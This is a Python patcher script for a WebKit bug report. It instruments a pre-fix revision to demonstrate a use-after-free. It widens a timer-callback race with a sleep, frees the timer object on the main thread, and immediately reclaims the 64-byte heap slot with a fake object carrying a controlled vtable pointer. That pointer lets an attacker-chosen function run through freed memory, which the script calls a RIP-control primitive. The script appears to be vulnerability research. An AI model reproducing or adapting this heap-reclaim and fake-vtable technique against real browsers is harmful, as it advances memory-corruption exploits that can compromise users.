#!/usr/bin/env python3
"""WK_INTERPOSE_EXPERIMENT patcher for BZ 315533 (WebKit pre-fix parent).

Applies research instrumentation IN THE UIPROCESS to the correct (true
pre-fix) revision, proving the primitive the analyst asks about:

  1. RunLoopCF.cpp  - widen the in-flight callback window: the timer
     callback sleeps WK_INTERPOSE_USLEEP_US (default 60 ms) BEFORE it
     virtual-dispatches through the raw context pointer. On real
     hardware the natural race window is sub-ms and probabilistic
     (~30% per 5-round exposure, device characterization); the widened
     window is RESEARCH INSTRUMENTATION so the primitive can be
     demonstrated deterministically on a CI runner.
  2. RemoteLayerTreeEventDispatcher.mm - make the teardown explicit:
     in ~RemoteLayerTreeEventDispatcher, destroy the timer (as member
     destruction would: on the MAIN thread, racing the scrolling
     callback), then IMMEDIATELY reclaim the freed 64-byte slot with a
     fake object whose +0 vptr and +8.. payload are fully chosen by
     this code. If the scrolling thread's in-flight callback dispatches
     through our fake vtable, wkInterposeHit() logs WK-INTERPOSE-HIT -
     i.e. a function pointer under our control was invoked on the
     scrolling thread through freed memory: the RIP-control-class
     primitive.

Everything is logged to /tmp/wk-interpose-log.txt (WK-INTERPOSE prefix)
so the workflow's verdict step can grep for it.
"""
import os
import sys

MM = "Source/WebKit/UIProcess/RemoteLayerTree/mac/RemoteLayerTreeEventDispatcher.mm"
CF = "Source/WTF/wtf/cf/RunLoopCF.cpp"
USLEEP = os.environ.get("WK_INTERPOSE_USLEEP_US", "60000")

def patch(path, old, new, tag):
    with open(path) as fh:
        src = fh.read()
    if old not in src:
        sys.exit(f"PATCH {tag}: pattern not found in {path}")
    src = src.replace(old, new, 1)
    with open(path, "w") as fh:
        fh.write(src)
    print(f"PATCH {tag}: applied to {path}")

# ---- 1. dispatcher dtor: explicit free + controlled reclaim -------------
MM_OLD = """RemoteLayerTreeEventDispatcher::~RemoteLayerTreeEventDispatcher()
{
#if ENABLE(MOMENTUM_EVENT_DISPATCHER)
    ASSERT(!m_momentumEventDispatcher);
#endif
    ASSERT(!m_displayRefreshObserverID);
}"""
MM_NEW = """// ---- WK_INTERPOSE_EXPERIMENT (research instrumentation) ------------------
#include <fcntl.h>
#include <unistd.h>
#include <sys/uio.h>
#include <string.h>
static void wkInterposeLog(const char* tag)
{
    // No libc string/buffer functions: WebKit builds with
    // -Werror,-Wunsafe-buffer-usage-in-libc-call. Fixed tag strings only.
    const char* prefix = "WK-INTERPOSE ";
    const char* newline = "\\n";
    struct iovec iov[3];
    iov[0].iov_base = const_cast<char*>(prefix);
    iov[0].iov_len = 13;
    iov[1].iov_base = const_cast<char*>(tag);
    iov[1].iov_len = strlen(tag);
    iov[2].iov_base = const_cast<char*>(newline);
    iov[2].iov_len = 1;
    int fd = open("/tmp/wk-interpose-log.txt", O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd >= 0) {
        writev(fd, iov, 3);
        close(fd);
    }
}
static void wkInterposeHit() { wkInterposeLog("HIT"); }
static void* wkInterposeFakeVtable[16] = {
    (void*)&wkInterposeHit, (void*)&wkInterposeHit, (void*)&wkInterposeHit,
    (void*)&wkInterposeHit, (void*)&wkInterposeHit, (void*)&wkInterposeHit,
    (void*)&wkInterposeHit, (void*)&wkInterposeHit, (void*)&wkInterposeHit,
    (void*)&wkInterposeHit, (void*)&wkInterposeHit, (void*)&wkInterposeHit,
    (void*)&wkInterposeHit, (void*)&wkInterposeHit, (void*)&wkInterposeHit,
    (void*)&wkInterposeHit,
};
RemoteLayerTreeEventDispatcher::~RemoteLayerTreeEventDispatcher()
{
#if ENABLE(MOMENTUM_EVENT_DISPATCHER)
    ASSERT(!m_momentumEventDispatcher);
#endif
    ASSERT(!m_displayRefreshObserverID);
    if (m_delayedRenderingUpdateDetectionTimer) {
        auto* raw = m_delayedRenderingUpdateDetectionTimer.release();
        wkInterposeLog("TEARDOWN-FREE");
        delete raw; // pre-fix: destroyed on the MAIN thread while the
                    // scrolling thread's CFRunLoopTimer callback may be
                    // in flight holding this raw pointer as context.
        // 64-byte fake object in the same fastMalloc size class. Layout via a
        // struct to avoid raw-pointer arithmetic (WebKit -Werror unsafe-buffer).
        struct WKInterposeFake {
            void* vptr;
            uint8_t payload[56];
        };
        static_assert(sizeof(WKInterposeFake) == 64, "must match the 64-byte class");
        auto* fake = static_cast<WKInterposeFake*>(malloc(sizeof(WKInterposeFake)));
        if (fake) {
            fake->vptr = (void*)&wkInterposeFakeVtable;      // controlled vptr
            for (auto& byte : fake->payload)                 // attacker-influenced bytes
                byte = 0x41;
            wkInterposeLog("SLOT-RECLAIMED");
        }
    }
}"""

patch(MM, MM_OLD, MM_NEW, "dispatcher-dtor")

# ---- 2. RunLoopCF.cpp: widen the in-flight callback window --------------
CF_OLD = """        auto timer = static_cast<TimerBase*>(context);
        if (!CFRunLoopTimerDoesRepeat(cfTimer))
            CFRunLoopTimerInvalidate(cfTimer);

        timer->fired();"""
CF_NEW = """        auto timer = static_cast<TimerBase*>(context);
        if (!CFRunLoopTimerDoesRepeat(cfTimer))
            CFRunLoopTimerInvalidate(cfTimer);

        // WK_INTERPOSE_EXPERIMENT: research widening of the in-flight window
        // (device-side the natural window is sub-ms and probabilistic).
        usleep(""" + USLEEP + """);

        timer->fired();"""

with open(CF) as fh:
    cf_src = fh.read()
if "WK_INTERPOSE_USLEEP_US" not in cf_src and "usleep" not in cf_src:
    patch(CF, CF_OLD, CF_NEW, "runloop-window")
else:
    print("PATCH runloop-window: already present, skipping")

# usleep needs unistd.h
if "#include <unistd.h>" not in cf_src:
    patch(CF, "#include <wtf/RunLoop.h>",
          "#include <wtf/RunLoop.h>\n#include <unistd.h>", "unistd")
else:
    print("PATCH unistd: already present, skipping")

print("WK_INTERPOSE_EXPERIMENT: all patches applied")